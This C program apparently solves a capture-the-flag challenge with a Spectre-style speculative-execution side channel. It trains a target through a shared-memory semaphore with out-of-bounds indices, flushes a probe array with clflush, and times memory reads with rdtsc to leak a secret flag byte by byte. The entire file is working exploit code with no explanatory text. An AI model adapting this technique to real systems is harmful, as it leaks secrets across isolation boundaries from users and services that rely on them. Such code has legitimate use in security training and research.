#define _GNU_SOURCE
#include <stdio.h>
#include <semaphore.h>
#include <sys/types.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <time.h>

uint64_t getTime(void *ptr){
    uint64_t start, end;
    _mm_lfence();
    start = __rdtsc();
    volatile uint64_t a = *(volatile uint64_t *)ptr;
    _mm_mfence();
    end = __rdtsc();
    return end - start;
}

const void *flush_cache()
{
  const void *result; // rax
  int i; // [rsp+0h] [rbp-Ch]

  for ( i = 0; i <= 255; ++i )
  {
    result = (const void *)((i + 0x1338LL) << 12);
    _mm_clflush(result);
  }
  return result;
}

int main()
{
    int cpu = time(0)%13;
    int pid = getpid();
    printf("cpu = %d\npid = %d\n",cpu,pid);
    cpu_set_t pwn_cpu;
    CPU_ZERO(&pwn_cpu);
    CPU_SET(cpu,&pwn_cpu);
    sched_setaffinity(pid, sizeof(cpu_set_t), &pwn_cpu);

    unsigned long shared_memory_base = 0x1337000;
    sem_t *sem = (sem_t *) shared_memory_base;
    int *index = (int *) (sem + 1);
    char flag[0x40];
    for (int i = 0; i < 0x40; i++)
    {
        int min_val = 0x1000;
        for (size_t k = 0; k < 500; k++)
        {
            for (size_t j = 0; j < 10; j++)
            {
                *index = 300;
                sem_post(sem);
            }
            sched_yield();
            flush_cache();
            *index = i;
            sem_post(sem);
            for (size_t j = 0x0; j < 0x100; j++)
            {
                int x = ((j * 167) + 13) & 255;
                uint64_t *mem_ptr = (uint64_t *) (shared_memory_base + 0x1000 + 0x1000*x);
                int a = getTime(mem_ptr);
                if(a < min_val){
                    min_val = a;
                    flag[i] = (char)(x);
                }
            }
        }
    }
    printf("flag = %s\n",flag);

    return 0;
}